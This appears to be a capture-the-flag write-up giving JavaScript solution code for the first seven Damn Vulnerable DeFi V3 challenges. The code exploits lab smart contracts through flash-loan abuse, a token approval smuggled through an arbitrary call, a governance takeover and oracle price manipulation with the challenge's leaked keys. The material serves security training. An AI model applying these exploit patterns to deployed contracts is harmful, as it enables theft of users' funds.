
#Challenge #1:        

Un-Stoppable

````
// lets transfer some amount directly to vault and make the if logic fail forever
await token.connect(player).transfer(vault.address, 10);
````

#Challenge #2:

Naive Receiver

````
await pool.connect(player).flashLoan(receiver.address, ETH, 0, "0x");
````

#Challenge #3:

Truster

````
let interface = new ethers.utils.Interface(["function approve(address spender, uint256 amount)"]);
let data = interface.encodeFunctionData("approve", [player.address, TOKENS_IN_POOL]);
await pool.connect(player).flashLoan(0, player.address, token.address, data);
await token.connect(player).transferFrom(pool.address, player.address,  TOKENS_IN_POOL);
````

#Challenge #4: 

[Challenge #4 - Side Entrance]

In the Flash Loan call deposit function and trick the contract flash loan check

```
this.attackerContract = await (await ethers.getContractFactory('AttackSideEntrance', player)).deploy(
    pool.address,
    player.address
);
await this.attackerContract.attack();
```

#Challenge #5

The Rewarder

````
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    // Advance time 5 days so that depositors can get rewards
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
    this.attackerContract = await ( await ethers.getContractFactory("AttackTheRewarder", player)).deploy(
        flashLoanPool.address, rewarderPool.address, liquidityToken.address, rewardToken.address
    );
    await this.attackerContract.attack();
});
````

#Challenge #6

Selfie [ Damn Vulnerable DeFi V3 Challenge 6 Solution: Selfie Walkthrough Guide ]

````
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */
    
    this.attackContract = await (await ethers.getContractFactory("AttackSelfie", player)).deploy(
    pool.address, governance.address, token.address
    );
    await this.attackContract.attack();
    const ACTION_DELAY = 3 * 24 * 60 * 60 + 1;
    await time.increase(ACTION_DELAY);
    await governance.connect(player).executeAction(1);
});
````

#Challenge #7

Damn Vulnerable DeFi V3 Challenge 7 Solution - Compromised Walkthrough

````
it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    // HEX --> ASCII --> Base64 Decode
    const PKEY1 = "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9";
    const PKEY2 = "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
    const signer1 = new ethers.Wallet(PKEY1, ethers.provider);
    const signer2 = new ethers.Wallet(PKEY2, ethers.provider);

    // Set Price - 1 WEI, and buy 1 NFT
    await oracle.connect(signer1).postPrice("DVNFT", 1);
    await oracle.connect(signer2).postPrice("DVNFT", 1);
    await exchange.connect(player).buyOne({value: 1});

    // Set Price - 999 ETH + 1 WEI, and sell 1 NFT
    await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE + BigInt(1));
    await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE + BigInt(1));
    await nftToken.connect(player).approve(exchange.address, 0);
    await exchange.connect(player).sellOne(0);

    // Set Original Price
    await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE);
    await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE);
});
````